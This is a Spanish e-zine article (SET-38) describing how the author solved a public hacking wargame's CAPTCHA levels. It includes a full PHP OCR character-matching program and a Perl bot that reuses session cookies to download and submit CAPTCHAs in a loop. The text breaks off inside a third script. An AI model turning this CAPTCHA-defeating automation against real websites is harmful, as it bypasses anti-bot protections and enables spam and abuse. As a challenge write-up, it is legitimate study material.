@@ -1,0 +1,970 @@
+-[ 0x0A ]--------------------------------------------------------------------
+-[ Captcha-Killer Wargame: OCR ]---------------------------------------------
+-[ by blackngel ]----------------------------------------------------SET-38--
+
+
+          ^^
+      *`* @@ *`*     HACK THE WORLD
+     *   *--*   *    
+          ##         <blackngel1@gmail.com>
+          ||         <black@set-ezine.org>
+         *  *
+        *    *       (C) Copyleft 2009 everybody
+       _*    *_
+
+
+1 - Introduccion
+
+2 - Breve Analisis
+
+3 - Dise~o e Implementacion
+
+4 - Wargame: El Reto
+
+5 - Ultimas
+
+6 - Conclusion
+
+7 - Referencias
+
+
+
+---[ 1 - Introduccion
+
+Chema Alonso, de Informatica 64, junto con sus secuaces, son bastante
+conocidos a estas alturas, ya sea por sus conferencias o por el desarrollo
+de todos los wargames que de un tiempo a esta parte llevan realizando.
+
+Todos ellos son gente que, haciendo honor al nombre de su blog, estan
+bastante asentados en lo que se conoce como "el lado del mal", es decir,
+con amplios conocimientos orientados a las plataformas de Microsoft.
+
+Es por ello que la mayoria de los retos que han planteado estan basados
+en tecnologias web asi como ASP.NET, Microsoft SQL Server, el servicio
+de protocolo ligero de acceso a directorio (LDAP) de la misma plataforma
+y demas...
+
+Aun siendo esto asi, no evita que todos los retos pudieran ser superados
+desde un entorno Linux o al menos de base Unix. Al fin y al cabo, casi
+todos se basaban en tecnicas de inyeccion, ya sea SQL, LDAP y otros juegos
+intelectuales.
+
+Teniendo en cuenta que hasta ahora todos se habian desarrollado por
+fases, en las que unos descubrimientos llevaban a otros niveles (las
+pistas estaban ahi para ayudar, o no), la aparicion del ultimo reto,
+el numero 9, parecia un caso un poco especial.
+
+Lo especial esta en que se centra unicamente en un aspecto de la seguridad
+de los entornos web, especificamente el problema que plantea la superacion
+del desafio-respuesta de una imagen "CAPTCHA" para un programa automatizado.
+Problema que supuestamente solo deberia poder ser solucionado por un
+humano.
+
+Cada nivel en el reto presentaba una debilidad y debia ser encontrada
+para pasar al siguiente. Claro que siempre quedaba implementar alguna
+clase de reconocimiento OCR, y con ello poder superar todas las fases
+(menos la ultima que era distinta y se superaba de un modo muy sencillo),
+con la misma herramienta.
+
+Durante este articulo nos centraremos en esta ultima posibilidad. Si
+quieres ir calentando motores entra en la siguiente direccion
+perteneciente al Reto 9 [1].
+
+
+
+---[ 2 - Breve Analisis
+
+Cuando empece a jugar con este juego, como siempre mucho mas tarde de que
+ya hubiera terminado y los premios hubieran sido otorgados (el reconocimiento
+del Hall of Fame), observe que las primeras fases estaban hechas para
+novatos.
+
+¿Como puede ser que las 4 primeras tengan el mismo nivel de dificultad? Es
+mas, puedo decir que la tercera es mas dificil incluso que la cuarta, debido
+a que en las pruebas 1, 2 y 4 el valor del texto mostrado en el Captcha podia
+ser leido directamente del codigo HTML.
+
+Como es sabido, cualquier persona con un minimo conocimiento de Perl o algo
+por el estilo puede automatizar las peticiones web, leer los codigos, y
+realizar un POST con la informacion adecuada.
+
+En resumen, si alguien quiere ver como se puede estudiar y superar cada reto
+de forma individual, recomiendo la lectura del solucionario escrito por
+nuestro amigo Kachakil [2].
+
+Habiendo perdido un poco la gracia, a uno se le vino a la mente, como no,
+la idea de desarrollar una solucion global para todos los niveles. Si
+generalizamos, sabemos que en todos los niveles tenemos una imagen, el
+Captcha, y que podemos descargarla. Si tuviesemos la capacidad de interpretar
+los caracteres en el contenidos y enviar el codigo de regreso a la pagina,
+tal vez tendriamos el premio en nuestras manos.
+
+OCR viene a nuestras mentes, reconocimiento de caracteres dentro de una imagen,
+pero la pregunta es siempre la misma: ¿Como?
+
+Como bien se ha dicho por ahi, nadie puede pretender abrir una imagen con un
+editor de texto, ya sea hexadecimal o no, y buscar a lo largo de todos los
+caracteres una cadena con el texto del captcha en si, esto es impensable
+desde luego.
+
+Pregunta: ¿La solucion?
+
+Respuesta: Reconocimiento de Patrones
+
+Si pudiesemos aislar los caracteres del Captcha, esto es, crear una imagen
+individual de cada uno, almacenarlas todas en una base de datos en relacion
+a su caracter real, y luego establecer un metodo de comparacion, por norma
+general deberiamos obtener en un amplio porcentaje de ocasiones el codigo
+correcto.
+
+Por suerte, buscando informacion sobre el tema en la red, encontre un pequeño
+motor con una idea bastante aceptable desarrollada en PHP que cubria mis
+espectativas para adaptarlo al reto.
+
+Esquematicamente el programa realiza lo siguiente:
+
+ 1 -> Abre la imagen captcha.
+
+      Explicacion: Para el reto se trata de abrir un GIF y convertirlo en JPEG.
+
+ 2 -> La limpia.
+
+      Explicacion: Consigue dejar en negro las letras y en blanco el fondo.
+
+ 3 -> Divide.
+
+      Explicacion: Crea una nueva imagen por cada caracter individual.
+
+ 4 -> Crear un mapa de los pixels.
+
+      Explicacion: Un documento incluyendo grupos de tres cifras indicando
+                   el valor de los colores rojo, verde y azul en cada pixel
+                   individual.
+
+ 5 -> Compara.
+
+      Explicacion: Compara el mapa de pixeles del caracter actualmente tratado
+                   con todos los mapas previamente almacenados en la base de
+                   datos. Aquel que presente mas coincidencias es candidato a
+                   ser el correto.
+
+Debo añadir que una vez acabado el desarrollo, lo probe antes de nada en otra
+clase de captchas en donde resulto ser mas efectivo que en el propio reto.
+
+
+
+---[ 3 - Dise~o e Implementacion
+
+A continuacion muestro el codigo que finalmente diseñe para la solucion del reto.
+Ire introduciendo antes de cada funcion todos los comentarios que sean necesarios
+para comprender su funcionamiento.
+
+Al final del codigo se explica de un modo mas sencillo como funciona el codigo
+y como realizamos el aprendizaje basico.
+
+
+-[ ocr.php ]-
+
+<?
+
+// Por defecto se trabaja en el modo normal (no aprendizaje)
+// En nombre por defecto de la imagen captcha es captcha.gif
+
+$mode_learn = 0;
+$input_code = "";
+$file_captcha = "captcha.gif";
+
+// Se comprueban los argumentos:
+// [-F] -> nombre de la imagen captcha
+// [-l] -> Codigo de la imagen captcha en modo aprendizaje
+
+if (($argc >= 1) && (($argv[1] == "-l") || ($argv[3] == "-l"))) {
+   $mode_learn = 1;
+   if ($argv[1] == "-l") {
+      $input_code = strtoupper($argv[2]);
+   }
+   elseif ($argv[3] == "-l") {
+      $input_code = strtoupper($argv[4]);
+   }
+}
+
+if ($argv[1] == "-f") {
+   $file_captcha = $argv[2];
+}
+
+// Se obtiene una lista de los archivos contiendo los mapas de pixeles
+// que forman la base de datos. De no haber ninguno, se al usuario
+// que inicie la sesiones de aprendizaje.
+
+$archivos = fileslist();
+
+if ( empty($archivos) && !($mode_learn)) {
+	print "\nBase de datos vacia. Inicie sesiones de aprendizaje.\n";
+	print "\nUsage: ". $argv[0] ." [-f CAPTCHA] [-l CODE]\n";
+	Exit;
+}
+
+$archivos = substr($archivos, 0, strlen($archivos)-1);
+$archivos = explode(",",$archivos);
+
+read_captcha();
+
+function read_captcha()
+{
+	global $file_captcha, $mode_learn;
+
+	// Las imagenes de los caracteres individuales seran en
+        // principio de 28 x 80 pixeles.
+
+	$width = 28;
+	$height = 80;
+
+	// Abrimos la imagen y comprobamos que existe.
+
+	$img = ImageCreateFromGif($file_captcha);
+
+	if (!$img) {
+		print "\nEl archivo no existe\n";
+		Exit;
+	}
+
+	// Convertimos el GIF a JPG para trabajar mejor.
+
+	imagejpeg($img, "captcha.jpg");
+	$newimg = ImageCreateFromJpeg("captcha.jpg");
+
+	// Limpiamos la imagen, esto es convertir el color de los
+        // caracteres a negro y el fondo a blanco.
+
+	$cleanimg = clean($newimg);
+	imagejpeg($cleanimg, "newcapt.jpg");
+
+	// Creamos 8 imagenes individuales de 28 x 80.
+        
+	$imgchar1 = imagecreate($width, $height);
+	$imgchar2 = imagecreate($width, $height);
+	$imgchar3 = imagecreate($width, $height);
+	$imgchar4 = imagecreate($width, $height);
+	$imgchar5 = imagecreate($width, $height);
+	$imgchar6 = imagecreate($width, $height);
+	$imgchar7 = imagecreate($width, $height);
+	$imgchar8 = imagecreate($width, $height);
+
+	// Dividimos el captcha en 8 partes de igual ancho (28 pixeles)
+        // y copiamos cada parte en las imagenes individuales.
+
+	imagecopy($imgchar1, $cleanimg, 1, 1,   0, 0, 28, 80);
+	imagecopy($imgchar2, $cleanimg, 1, 1,  28, 0, 28, 80);
+	imagecopy($imgchar3, $cleanimg, 1, 1,  56, 0, 28, 80);
+	imagecopy($imgchar4, $cleanimg, 1, 1,  84, 0, 28, 80);
+	imagecopy($imgchar5, $cleanimg, 1, 1, 112, 0, 28, 80);
+	imagecopy($imgchar6, $cleanimg, 1, 1, 140, 0, 28, 80);
+	imagecopy($imgchar7, $cleanimg, 1, 1, 168, 0, 28, 80);
+	imagecopy($imgchar8, $cleanimg, 1, 1, 196, 0, 28, 80);
+
+	// Guardamos las nuevas imagenes conteniendo los caracteres
+        // individuales en el disco duro.
+
+	imagejpeg($imgchar1, "chr1.jpg");
+	imagejpeg($imgchar2, "chr2.jpg");
+	imagejpeg($imgchar3, "chr3.jpg");
+	imagejpeg($imgchar4, "chr4.jpg");
+	imagejpeg($imgchar5, "chr5.jpg");
+	imagejpeg($imgchar6, "chr6.jpg");
+	imagejpeg($imgchar7, "chr7.jpg");
+	imagejpeg($imgchar8, "chr8.jpg");
+
+	// Reabrimos dichas imagenes y ejecutamos una funcion que
+        // intenta averiguar la posicion del caracter para aislarlo
+        // y crear una imagen mas recortada del mismo. 
+
+	$ch1 = cut_img(ImageCreateFromJpeg("chr1.jpg"));
+	$ch2 = cut_img(ImageCreateFromJpeg("chr2.jpg"));
+	$ch3 = cut_img(ImageCreateFromJpeg("chr3.jpg"));
+	$ch4 = cut_img(ImageCreateFromJpeg("chr4.jpg"));
+	$ch5 = cut_img(ImageCreateFromJpeg("chr5.jpg"));
+	$ch6 = cut_img(ImageCreateFromJpeg("chr6.jpg"));
+	$ch7 = cut_img(ImageCreateFromJpeg("chr7.jpg"));
+	$ch8 = cut_img(ImageCreateFromJpeg("chr8.jpg"));
+
+	// Guardamos nuevamente los resultados.
+
+	#imagejpeg($ch1, "chr1.jpg");
+	#imagejpeg($ch2, "chr2.jpg");
+	#imagejpeg($ch3, "chr3.jpg");
+	#imagejpeg($ch4, "chr4.jpg");
+	#imagejpeg($ch5, "chr5.jpg");
+	#imagejpeg($ch6, "chr6.jpg");
+	#imagejpeg($ch7, "chr7.jpg");
+	#imagejpeg($ch8, "chr8.jpg");
+
+	// Creamos un mapa de pixeles para cada caracter.
+
+	$datamap1 = createchardatamap($ch1, "noname");
+	$datamap2 = createchardatamap($ch2, "noname");
+	$datamap3 = createchardatamap($ch3, "noname");
+	$datamap4 = createchardatamap($ch4, "noname");
+	$datamap5 = createchardatamap($ch5, "noname");
+	$datamap6 = createchardatamap($ch6, "noname");
+	$datamap7 = createchardatamap($ch7, "noname");
+	$datamap8 = createchardatamap($ch8, "noname");
+
+	$datamap1 = explode("@", $datamap1);
+	$datamap1 = substr($datamap1[1], 1, strlen($datamap1[1]));
+	$datamap1 = explode(":", $datamap1);
+	$nummap1 = count($datamap1);
+
+	$datamap2 = explode("@", $datamap2);
+	$datamap2 = substr($datamap2[1], 1, strlen($datamap2[1]));
+	$datamap2 = explode(":", $datamap2);
+	$nummap2 = count($datamap2);
+
+	$datamap3 = explode("@", $datamap3);
+	$datamap3 = substr($datamap3[1], 1, strlen($datamap3[1]));
+	$datamap3 = explode(":", $datamap3);
+	$nummap3 = count($datamap3);
+
+	$datamap4 = explode("@", $datamap4);
+	$datamap4 = substr($datamap4[1], 1, strlen($datamap4[1]));
+	$datamap4 = explode(":", $datamap4);
+	$nummap4 = count($datamap4);
+
+	$datamap5 = explode("@", $datamap5);
+	$datamap5 = substr($datamap5[1], 1, strlen($datamap5[1]));
+	$datamap5 = explode(":", $datamap5);
+	$nummap5 = count($datamap5);
+
+	$datamap6 = explode("@", $datamap6);
+	$datamap6 = substr($datamap6[1], 1, strlen($datamap6[1]));
+	$datamap6 = explode(":", $datamap6);
+	$nummap6 = count($datamap6);
+
+	$datamap7 = explode("@", $datamap7);
+	$datamap7 = substr($datamap7[1], 1, strlen($datamap7[1]));
+	$datamap7 = explode(":", $datamap7);
+	$nummap7 = count($datamap7);
+
+	$datamap8 = explode("@", $datamap8);
+	$datamap8 = substr($datamap8[1], 1, strlen($datamap8[1]));
+	$datamap8 = explode(":", $datamap8);
+	$nummap8 = count($datamap8);
+
+	// Busca en la base de datos que archivos (mapas de pixeles)
+        // son mas parecidos a los mapas que acabamos de crear para
+	// los caracteres del captcha a analizar.
+
+	$texto .= charletter($datamap1, "chr1.jpg", 0);
+	$texto .= charletter($datamap2, "chr2.jpg", 1);
+	$texto .= charletter($datamap3, "chr3.jpg", 2);
+	$texto .= charletter($datamap4, "chr4.jpg", 3);
+	$texto .= charletter($datamap5, "chr5.jpg", 4);
+	$texto .= charletter($datamap6, "chr6.jpg", 5);
+	$texto .= charletter($datamap7, "chr7.jpg", 6);
+	$texto .= charletter($datamap8, "chr8.jpg", 7);
+
+	// Borramos las imagenes temporales de los caracteres.
+
+	#unlink("chr1.jpg");
+	#unlink("chr2.jpg");
+	#unlink("chr3.jpg");
+	#unlink("chr4.jpg");
+	#unlink("chr5.jpg");
+	#unlink("chr6.jpg");
+	#unlink("chr7.jpg");
+	#unlink("chr8.jpg");
+
+	if ($mode_learn == 0) {
+		#print "\nTexto Reconocido: $texto\n";
+		print $texto;
+        }
+
+	#print "\n";
+	return;
+}
+
+// Esta funcion se encarga de convertir el color de las letras a negro y el
+// de fondo a blanco. Para ello se ha estudiado el captcha con GIMP y se ha
+// advertido que por norma general el color verde de los pixeles que forman
+// los caracteres no supera el valor 50, y que para el azul suele estar por
+// debajo de 95.
+// La funcion recorre la imagen pixel por pixel comprobando sus colores verde
+// y azul, de estar por debajo de los valores citados se convierten a negro,
+// (0,0,0) en cualquier otro caso el pixel se convierte en blanco (255,255,255).
+
+function clean ($image)
+{
+	$w = imagesx($image);
+	$h = imagesy($image);
+	for ($x = 0; $x <= $w; $x++) {
+        	for ($i = 0; $i <= $h; $i++) {
+			$rgb = imagecolorat($image, $x, $i);
+			$r = ($rgb >> 16) & 255;
+			$g = ($rgb >> 8) & 255;
+			$b = $rgb & 255;
+				if (($g < 50) && ($b < 95)) {
+       imagesetpixel($image, $x, $i, imagecolorallocate($image, 0, 0, 0));
+				} else {
+       imagesetpixel($image, $x, $i, imagecolorallocate($image, 255, 255, 255));		
+				}
+		}
+	}
+
+	return $image;
+} 
+
+// Esta funcion toma como primer parametro el mapa de pixeles de un caracter
+// individual a comparar con los mapas de pixeles de todos los caracteres
+// almacenados previamente en la base de datos. Se va incrementando un contador
+// de errores que indica el numero de diferencias entre los mapas, y se tomara
+// como caracter correcto aquel que tuviera menos errores.
+//
+// Luego, si se esta en modo aprendizaje, se llama a learnchar() para almacenar
+// el mapa de pixeles del caracter comparado, siempre y cuando no exista ya uno
+// exactamente igual en la base de datos (errores == 0).
+
+function charletter($datamap1, $file, $pos)
+{
+	global $archivos, $mode_learn, $input_code;
+	$errores =0;
+	for ($i=0; $i < count($archivos); $i++) {
+
+		$data = base64_decode(str_rot13(fileread($archivos[$i])));
+		$data = explode("@",$data);
+		$data = substr($data[1], 1, strlen($data[1]));
+		$data = explode(":",$data);
+		$numdata = count($data);
+
+		for ($x=0; $x <= $numdata-1; $x++) {
+			if (($data[$x]) != ($datamap1[$x])) {
+				$errores++;
+			}
+		}
+
+		$erroresa[$i] = $errores;
+		$erroresb[$i] = $archivos[$i];
+		$errores = 0;
+	}
+
+	$value = min($erroresa);
+	$key = array_search($value, $erroresa);
+	$letra = base64_decode(str_rot13(fileread($erroresb[$key])));
+	$letra = explode("@",$letra);
+
+	if ($value != 0 && $mode_learn) {
+		learnchar($file, $input_code[$pos]);
+	}
+
+	return $letra[0];
+}
+
+// Lee el contenido de un fichero individual de la base de datos.
+
+function fileread($filename)
+{
+	$filename= "./bd/".trim($filename);
+	$handle = fopen($filename, "r");
+	$contents = fread($handle, filesize($filename));
+	fclose($handle);
+	return $contents;
+}
+
+// Obtiene una lista de todos los archivos presentes en la base de datos.
+
+function fileslist()
+{
+	$archivos="";
+	$dir = opendir("./bd/");
+	while (false !== ($file = readdir($dir))) {
+		if(strpos($file,"charmap")) {
+			$archivos .= $file.",";
+		}
+	}
+	return $archivos;
+}
+
+// Aprende un caracter, esto es: Abrir la imagen del caracter individual,
+// crear el mapa de pixeles y guardar el resultado en un nuevo archivo para
+// la base de datos codificandolo previamente en Base64 y Rot13.
+
+function learnchar($image,$name)
+{
+	global $width,$height;
+	$imagen = ImageCreateFromJpeg($image);
+	$datamap = str_rot13(base64_encode(createchardatamap($imagen,$name)));
+	save_datamap($datamap,$name);
+	print "Nuevo caracter ['$name'] agregado a la Base de Datos\n";
+}
+
+// Esta funcion no es necesaria en aquellos tipos de captcha donde todos sus
+// caracteres se encuentran en la misma linea horizontal.
+//
+// Su mision es detectar en que linea comienza el caracter dentro de la imagen
+// y para ello se base en encontrar una amplia presencia de pixeles negros (o
+// al reves, donde no existe gran concentracion de pixeles blancos). Una vez
+// obtenida la linea de comienzo, simplemente se corta la imagen a partir de
+// ahi con una altura de 28 pixeles.
+
+function cut_img($image)
+{
+	global $width,$height;
+
+	$white_pix = 0;
+	$has_black = 0;
+
+	$w = imagesx($image);
+	$h = imagesy($image);
+	for ($x = 0; $x <= $h; $x++) {
+        	for ($i = 0; $i <= $w; $i++) {
+			$rgb = imagecolorat($image, $i, $x);
+			$r = ($rgb >> 16) & 255;
+			$g = ($rgb >> 8) & 255;
+			$b = $rgb & 255;
+			if (($r == 255) && ($g == 255) && ($b == 255)) {
+				$white_pix += 1;
+			} else if (($r == 0) && ($g == 0) && ($b == 0)) {
+				$has_black = 1;
+			}
+		}
+
+		if ( ($white_pix < 13) && ($has_black == 1) ) {
+			$init_line = $x - 3;
+			$width = 28;
+			$height = 28;
+
+			$imgcut = imagecreate($width, $height);
+	       imagecopy($imgcut, $image, 1, 1, 0, $init_line, $width, $height);
+			imagejpeg($imgcut, "chrcut.jpg");
+			$rimg = ImageCreateFromJpeg("chrcut.jpg");
+			$is_letter = check_letter($rimg);
+			if ($is_letter)
+				break;
+			else
+				$rimg = null;
+		}
+
+		$white_pix = 0;
+		$has_black = 0;
+	}
+
+	return $rimg;
+}
+
+// Funcion de apoyo a la anterior. Comprueba que la imagen resultante de la
+// funcion previa tenga al menos una cantidad igual o superior a 70 pixeles
+// negros. En caso contrario es que nos hemos equivocado en la linea de comienzo
+// y no hemos recortado el caracter correctamente.
+
+function check_letter($image)
+{
+	$black_pix = 0;
+
+	$w = imagesx($image);
+	$h = imagesy($image);
+	for ($x = 0; $x <= $h; $x++) {
+        	for ($i = 0; $i <= $w; $i++) {
+			$rgb = imagecolorat($image, $i, $x);
+			$r = ($rgb >> 16) & 255;
+			$g = ($rgb >> 8) & 255;
+			$b = $rgb & 255;
+			if (($r == 0) && ($g == 0) && ($b == 0)) {
+				$black_pix += 1;
+			}
+		}
+	}
+
+	if ($black_pix >= 70)
+		return 1;
+	else
+		return 0;
+}
+
+// Guarda el mapa de pixeles en la base de datos. En nombre del archivo estara
+// compuesto por:
+//    1 - Caracter
+//    2 - Cadena md5 aleatoria
+//    3 - "-charmap.datamap"
+//
+// Esto se hace porque en el proceso de aprendizaje almacenaremos no solo un
+// mapa de pixeles por cada letra, sino varios, de modo que el motor de
+// comparacion tenga mas posibilidades de acertar con el caracter adecuado.
+
+function save_datamap($datamap,$name)
+{
+   $fl = fopen("./bd/$name-".md5(time()*rand(1,100))."-charmap.datamap","w+");
+   fwrite($fl,$datamap);
+   fclose($fl);
+}
+
+// Crea el mapa de pixeles. En resumen el formato es:
+//    1 - Caracter
+//    2 - @
+//    3 - :
+//    4 - coordenada x
+//    5 - coordenada y
+//    6 - color del pixel (0 = blanco, 1 = negro)
+//
+//    Por ejemplo: A@:0,0,1:0,1,0:0,2,1:...
+
+function createchardatamap($image,$name)
+{
+	global $width,$height;
+
+	$datamap=$name."@";
+	for ($x=0; $x<=$width; $x++){
+		for ($y=0; $y<=$height; $y++){
+			$datamap.=":".$x.",".$y.",".pixelcolor($image,$x,$y);
+			}
+	}
+	return $datamap;
+}
+
+// Esta funcion recibe como parametros una imagen y las coordenadas de un
+// pixel. Devuelve 0 si este es blanco o 1 si es negro.
+
+function pixelcolor($im, $x, $y)
+{
+	$rgb = imagecolorat($im,$x,$y);
+	$r = ($rgb >> 16) & 255;
+	$g = ($rgb >> 8) & 255;
+	$b = $rgb & 255;
+		
+	if (($r > 55) || ($g > 55) || ($b > 55)){
+		return 0;
+	}
+
+	return 1;
+}
+
+?>
+
+-[ end ocr.php ]-
+
+Os aseguro que con un poco de paciencia es extremadamente sencillo de
+entender.
+
+Imaginemos el siguiente captcha:
+
+          o-----------------o
+          |         J   F   |
+          |     F O   S     |
+          | B H           X |
+          o-----------------o
+
+Los caracteres tienen todos diferentes tonalidades de rojo, y el fondo es una
+especie de azul grisaceo. La funcion clean( ) creaba una nueva imagen siendo
+los caracteres de color negro y el fondo de blanco (aunque algun pixel se puede
+escapar si no cumple con las condiciones establecidas).
+
+Luego se crean 8 nuevas imagenes tal que asi:
+
+          o---o  o---o  o---o  o---o  o---o  o---o  o---o  o---o
+          |   |  |   |  |   |  |   |  | J |  |   |  | F |  |   |
+          |   |  |   |  | F |  | O |  |   |  | S |  |   |  |   |
+          | B |  | H |  |   |  |   |  |   |  |   |  |   |  | X |
+          o---o  o---o  o---o  o---o  o---o  o---o  o---o  o---o
+
+Y finalmente llamamos a cut_img( ) para que detecte la posicion real del
+caracter y recorte las imagenes adecuadamente:
+
+          o---o  o---o  o---o  o---o  o---o  o---o  o---o  o---o
+          | B |  | H |  | F |  | O |  | J |  | S |  | F |  | X |
+          o---o  o---o  o---o  o---o  o---o  o---o  o---o  o---o
+
+Si es la primera vez que ejecutamos el programa, y tenemos la base de datos
+vacia, nos pedira que iniciemos algunas sesiones de aprendizaje. Para aprender
+este captcha especifico tendriamos que llamar al programa de la siguiente
+manera:
+
+   blackngel@mac:~/captcha-killer$ php ocr.php -l BHFOJSFX
+
+Y el programa nos responderia:
+
+   Nuevo caracter ['B'] agregado a la Base de Datos
+   Nuevo caracter ['H'] agregado a la Base de Datos
+   Nuevo caracter ['F'] agregado a la Base de Datos
+   Nuevo caracter ['O'] agregado a la Base de Datos
+   Nuevo caracter ['J'] agregado a la Base de Datos
+   Nuevo caracter ['S'] agregado a la Base de Datos
+   Nuevo caracter ['F'] agregado a la Base de Datos
+   Nuevo caracter ['X'] agregado a la Base de Datos
+
+Y de forma manual podriamos ir descargando captchas con todos los diversos
+caracteres e ir aprendiendolos. Fijate que puedes aprender muchas veces el
+mismo caracter, ya que este estara en posiciones distintas, y esto ayudara
+a acertar muchas mas veces cuando se hagan las comprobaciones.
+
+Para detectar el texto de un captcha tan solo tenemos que indicarle el nombre
+del mismo con la opcion "-f" o sin ningun parametro si se llama "captcha.gif"
+ya que este es el nombre por defecto.
+
+Lo unico que queda por comentar aqui es esto:
+
+	if ($mode_learn == 0) {
+		#print "\nTexto Reconocido: $texto\n";
+		print $texto;
+        }
+
+	#print "\n";
+
+Para un uso normal descomentariamos las dos sentencias "print" que hemos
+comentado (y comentariamos la descomentada) de forma que el resultado se
+imprima de una forma mas amigable.
+
+Yo lo he puesto asi de momento, ya que este programa sera llamado dentro
+de un script perl que es el encargado de conectarse a la web del reto con
+los valores adecuados y descargar la imagen captcha a analizar.
+
+Dentro de este script perl se utiliza la sentencia "$captcha = `php ocr.php`;"
+que retornara el texto detectado para el captcha recien descargado, y es por
+eso que solo queremos que imprima el texto del captcha sin ningun agregado
+que pueda molestarnos.
+
+Vamos seguidamente a estudiar este script.
+
+
+
+---[ 4 - Wargame: El Reto
+
+El siguiente script escrito en lenguaje Perl tiene como mision conectarse a
+la pagina del Nivel 4 del Reto Hacking 9 de Informatica 64, descargando la
+imagen captcha que en el mismo se presenta, analizar el texto correspondiente
+con la ayuda de "ocr.php" (descrito en la seccion anterior), y rellenar el
+formulario de la citada pagina hasta conseguir 1000 aciertos.
+
+La direccion es la siguiente:
+
+     http://retohacking9.elladodelmal.com/Niveles/Nivel04/Default.aspx
+
+Previamente debemos haber iniciado una sesion en la pagina con un navegador
+normal y corriente (como firefox). Luego, con un plugin como Tamper-Data
+obtenemos los datos que se envian al rellenar el formulario.
+
+Entre ellos lo mas importante es la Cookie, de la cual debemos coger los
+valores: .ASPXAUTH y ASP.NET_SessionId, de modo que el script pueda hacer
+peticiones como si se tratase del navegador y estuviese bien autentificado.
+
+A la hora de rellenar el formulario debemos cumplimentar los campos:
+
+   __EVENTARGUMENT     -> Valor extraido de la pagina
+   __VIEWSTATE         -> Valor extraido de la pagina
+   __EVENTVALIDATION   -> Valor extraido de la pagina
+   ctl00\$ContentPlaceHolder1\$txtCaptcha   -> El codigo del captcha
+   ctl00\$ContentPlaceHolder1\$btEnviar     -> "Enviar"
+
+Pero antes de enviar este formulario debemos leer el contenido de la pagina
+en busca de la cadena "ImgCapcha" sabiendo que 16 caracteres mas alla se
+encuentra la direccion o nombre de la imagen captcha, que guardaremos en la
+variable $img y que descargaremos de la direccion:
+
+     "http://retohacking9.elladodelmal.com/Niveles/Nivel04/$img"
+
+Despues de enviar el formulario con toda la informacion cumplimentada, solo
+queda esperar ir obtentiendo las respuestas que son extraidas de la misma:
+
+Aqui el script:
+
+-[ reto_cap.pl ]-
+
+#!/usr/bin/perl -w
+
+use LWP::UserAgent;
+use HTTP::Cookies;
+use HTTP::Request::Common qw(POST);
+
+my $captcha = "";
+
+my $ua = LWP::UserAgent->new() or die;
+
+my $cookie = '.ASPXAUTH=FC5BD1B2E0FC8A3C881E698C58A5CBC87150BC9FB8E9C721D06D6CA
+E0D7065844E1F69951595059B340363B8E6A1A433B24A00054D0AAE68E380AACEC4164014FFC026
+318FA979304EEB7BEF3558BDE7; ASP.NET_SessionId=r4yjfs2dkckyun55e20ujhbu';
+
+my $useragent = 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008
+072820 Firefox/3.0.1';
+
+my @header = ('User-Agent' => $useragent, 'Cookie' => $cookie, 'Connection' =>
+              'keep-alive', 'Keep-Alive' => '300');
+
+my $url = 'http://retohacking9.elladodelmal.com/Niveles/Nivel04/Default.aspx';
+my $response = $ua->post($url, @header);
+
+my $content = $response->content;
+
+my $x = index($content, "ImgCapcha") + 16;
+$content = substr($content, $x);
+$x = index($content, "style") - 2;
+my $img = substr($content, 0, $x);
+
+$txtcaptcha = "ctl00\$ContentPlaceHolder1\$txtCaptcha";
+$btenviar = "ctl00\$ContentPlaceHolder1\$btEnviar";
+
+while (1) {
+
+	print "\nImage = $img";
+
+	$req = HTTP::Request->new(GET => "http://retohacking9.elladodelmal.com
+                                          /Niveles/Nivel04/$img");
+
+	$request = $ua->request($req);
+
+	open(IMAGEN, ">captcha.gif") || die "No se pudo crear archivo: $!";
+	print IMAGEN $request->content;
+	close IMAGEN;
+
+	$captcha = `php ocr.php`;
+	print "\nCaptcha: $captcha\n";
+
+@header = ('User-Agent' => $useragent, 'Cookie' => $cookie, 'Connection' =>
+           'keep-alive', 'Keep-Alive' => '300', Content => [ __EVENTTARGET =>
+            "", __EVENTARGUMENT => "", __VIEWSTATE => "/wEPDwUKMTEwNjI0MjY0MQ
+            9kFgJmD2QWAgIDD2QWAgIBD2QWAgIDD2QWAgIBD2QWAgIDDw8WAh4ISW1hZ2VVcmw
+            FFWltYWdlbmVzL0dOQlFHT0dHLmdpZmRkGAIFHl9fQ29udHJvbHNSZXF1aXJlUG9z
+            dEJhY2tLZXlfXxYCBSNjdGwwMCRMb2dpblZpZXcxJExvZ2luU3RhdHVzMSRjdGwwM
+            QUjY3RsMDAkTG9naW5WaWV3MSRMb2dpblN0YXR1czEkY3RsMDMFEGN0bDAwJExvZ2
+            luVmlldzEPD2QCBWTuf7wPzWAP7wbywWopu9vknBCuhg==",
+           __EVENTVALIDATION => "/wEWBALp/4JbAqyhgvUPArXmppIHArC746EO5duXAU3C
+            nqKFhQ0c4HrRx+AvpUw=", $txtcaptcha => $captcha, $btenviar =>
+            "Enviar" ]);
+
+	$response = $ua->post($url, @header);
+
+	my $res = $response->content;
+	$x = index($res, "lbSalida") + 66;
+	$respuesta = substr($res, $x);
+	$x = index($respuesta, "</span>");
+	$respuesta = substr($respuesta, 0, $x);
+
+	print "\n-> $respuesta";
+
+	$x = index($res, "ImgCapcha") + 16;
+	$res = substr($res, $x);
+	$x = index($res, "style") - 2;
+	$img = substr($res, 0, $x);
+}
+
+-[ end reto_cap.pl ]-
+
+El unico defecto es que la conjuncion de este script con el programa en php
+de reconocimiento OCR no trabajan todo lo rapido que uno desearia, y la
+necesidad de acertar 1000 captchas en menos de 1 hora hace que la unica
+solucion temporal sea ejecutar ambos programas desde varios ordenadores al
+mismo tiempo.
+
+
+
+---[ 5 - Ultimas
+
+El nivel 4 de este reto resulto ser bueno y malo al mismo tiempo para comenzar
+con esta opcion del reconocimiento OCR. Por una parte es obvio que podria
+haberse superado de un modo mucho mas sencillo, ya que el nombre de la imagen
+que se podia leer en el codigo fuente de la pagina solicitada era exactamente
+el codigo del captcha.
+
+Pero cabe decir que esto a su vez fue estupendo para realizar las sesiones de
+aprendizaje de un modo automatico, ya que bastaba con crear un script que
+actualizara la pagina, descargara la imagen captcha y le pasara al programa
+ocr.php el nombre de la imagen leido mediante la opcion de aprendizaje "-l".
+
+El script que aqui presento realiza perfectamente esa tarea, y se ejecuta en
+un bucle infinito hasta que el usuario lo detiene con Ctrl-C.
+
+-[ learn.pl ]-
+
+#!/usr/bin/perl -w
+
+use LWP::UserAgent;
+use HTTP::Cookies;
+use HTTP::Request::Common qw(POST);
+
+my $captcha = "";
+
+my $ua = LWP::UserAgent->new() or die;
+
+my $cookie = '.ASPXAUTH=3C562E5B97165AAC052D9AAB19521ADC91F3ABB160A43427EF120E
